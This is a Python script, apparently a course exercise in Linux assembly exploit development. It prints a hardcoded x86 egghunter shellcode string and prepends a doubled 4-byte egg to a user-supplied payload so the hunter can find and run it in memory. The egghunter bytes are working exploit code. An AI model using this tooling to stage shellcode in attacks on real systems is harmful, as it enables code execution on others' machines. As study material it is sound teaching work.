# Specify a 4 byte egg value and a payload and the script will output the egghunter and
# payload with the proper 8 byte egg prefix.
# This was created as part of the SecurityTube Linux Assembly Expert
# course at http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
#
# Travis Mathison
#
# The MIT License (MIT)
#
# Copyright (c) 2018 Travis Mathison
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

#!/usr/bin/python

from optparse import OptionParser

def to_hex(val):
    return ''.join('\\x' + val[i:i + 2] for i in range(0, len(val), 2))

parser = OptionParser()
parser.description = "Generates egghunter shellcode with payload."
parser.add_option("-e", "--egg", dest="egg", help="The 4 byte egg to use (e.g. 90509050)", type="string")
parser.add_option("-p", "--payload", dest="payload", help="Payload shellcode (e.g. \\x31\\xc0\\...)", type="string")

(options, args) = parser.parse_args()
if not options.egg or not options.payload:
    parser.print_help()
    exit(1)

if not len(options.egg) == 8:
    print("Invalid egg size")
    exit(1)

egghunter = (
    "\\x31\\xd2\\x66\\x81\\xca\\xff\\x0f\\x42\\x8d\\x5a\\x04\\x6a\\x21\\x58\\xcd\\x80\\x3c\\xf2\\x74\\xee\\xb8"
    + to_hex(options.egg)
    + "\\x89\\xd7\\xaf\\x75\\xe9\\xaf\\x75\\xe6\\xff\\xe7")

payload = (to_hex(options.egg) + to_hex(options.egg) + options.payload)

print("\nEgghunter = \"" + egghunter + "\"")
print("Payload = \"" + payload + "\"\n")

